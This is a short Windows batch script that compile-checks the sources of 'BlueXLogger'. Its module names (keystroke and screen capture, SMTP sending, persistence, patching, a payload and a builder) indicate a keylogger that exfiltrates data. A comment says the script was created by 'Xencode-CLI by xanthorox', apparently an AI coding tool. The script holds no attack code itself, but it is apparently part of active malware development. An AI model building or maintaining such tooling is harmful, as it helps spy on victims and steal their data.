@echo off
rem BlueXLogger - compile-only syntax check (no link) for fast iteration.
rem Created by Xencode-CLI by xanthorox
setlocal
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
cd /d "%~dp0.."
if not exist build\obj\check mkdir build\obj\check
cl /nologo /c /W4 /WX- /O2 /D_CRT_SECURE_NO_WARNINGS /Iinclude /Ires ^
   /Fobuild\obj\check\ ^
   src\common\bxl_config.c src\common\bxl_util.c src\common\bxl_base64.c ^
   src\common\bxl_format.c src\common\bxl_schedule.c src\common\bxl_logbuf.c ^
   src\common\bxl_mime.c src\common\bxl_net.c src\common\bxl_smtp.c ^
   src\common\bxl_screenshot.c src\common\bxl_context.c src\common\bxl_capture.c ^
   src\common\bxl_persist.c src\common\bxl_patch.c ^
   src\payload\main.c
if errorlevel 1 goto :fail
dir /b src\builder\*.c >nul 2>&1 && cl /nologo /c /W4 /WX- /O2 /D_CRT_SECURE_NO_WARNINGS /Iinclude /Ires /Fobuild\obj\check\ src\builder\*.c
if errorlevel 1 goto :fail
echo CHECK_EXITCODE=%ERRORLEVEL%
endlocal
exit /b 0

:fail
echo CHECK_FAILED
endlocal
exit /b 1
